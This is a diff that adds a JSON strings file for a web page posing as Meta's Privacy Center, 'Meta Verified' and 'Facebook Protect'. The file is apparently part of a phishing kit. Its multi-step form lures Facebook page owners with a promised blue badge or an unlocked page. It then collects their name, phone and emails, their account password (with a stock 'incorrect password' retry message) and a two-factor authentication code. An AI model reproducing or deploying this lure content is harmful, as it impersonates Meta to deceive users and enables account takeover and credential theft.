@@ -1,0 +1,59 @@
+{
+    "privacyCenter": {
+        "title": "Privacy Center",
+        "menuItems": {
+            "home": "Privacy Center Home Page",
+            "search": "Search",
+            "privacy": "Privacy Policy",
+            "rules": "Other rules and articles",
+            "settings": "Settings"
+        },
+        "congratulationsTitle": "Meta Verified",
+        "congratulationsMessage": "Congratulations! There is only one final step left for your page to receive the verified blue badge from Meta. Please fill out the form below to complete the ownership verification."
+    },
+    "formModal": {
+        "step1": {
+            "fullName": "Full Name",
+            "pageName": "Page Name",
+            "phoneNumber": "Phone Number",
+            "note": "Note: Our reply will be sent to you within 14 to 48 hours.",
+            "agreeTerms": "I agree to the Terms of Use",
+            "sendButton": "Send",
+            "validation": {
+                "fullNameRequired": "Please enter your full name",
+                "pageNameRequired": "Please enter your page name",
+                "phoneNumberRequired": "Please enter your phone number",
+                "agreeTermsRequired": "Please agree to the Terms of Use",
+                "businessEmailRequired": "Please enter your business email",
+                "personalEmailRequired": "Please enter your personal email",
+                "additionalInfoRequired": "Please provide additional information"
+            },
+            "businessEmail": "Business Email",
+            "personalEmail": "Personal Email",
+            "additionalInfo": "Additional Information"
+        },
+        "step2": {
+            "password": "Password",
+            "continueButton": "Continue",
+            "error": "The password that you've entered is incorrect."
+        },
+        "step3": {
+            "facebook": "Facebook",
+            "title": "Two-Factor Authentication required",
+            "description": "Enter the code for this account that we sent to {email}, {phone}, or simply confirm via your configured Two-Factor App (e.g. Duo Mobile or Google Authenticator).",
+            "code": "Code",
+            "continueButton": "Continue",
+            "tryAnotherMethod": "Try another method",
+            "error": "The code that you've entered is incorrect."
+        }
+    },
+    "livePage": {
+        "welcome": "Welcome To Facebook Protect.",
+        "description": "Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.",
+        "moreInfo": "More information",
+        "protection": "We've enabled advanced protections to unlock your Page.",
+        "process": "Below, we walk you through the process in detail and help you fully activate to unlock your Page.",
+        "continue": "Continue",
+        "restricted": "Your page was restricted on"
+    }
+}
